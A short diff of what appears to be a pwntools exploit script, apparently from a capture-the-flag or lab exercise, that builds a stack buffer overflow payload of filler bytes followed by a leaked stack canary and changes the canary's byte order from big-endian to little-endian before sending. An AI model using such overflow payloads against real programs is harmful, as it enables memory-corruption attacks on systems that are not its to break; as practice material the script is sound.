@@ -37,9 +37,9 @@ res = io.recvlines(1)
 print("____________________________________")
 print(res)
 
-le = p64(int(CANARY, 16))
+le = p64(int(CANARY, 16), "little")
 be = p64(int(CANARY, 16), endianness="big")
-payload = b"A" * BUFF_SIZE + be
+payload = b"A" * BUFF_SIZE + le
 print(f"Sending payload: {payload}")
 
 io.sendline(payload)
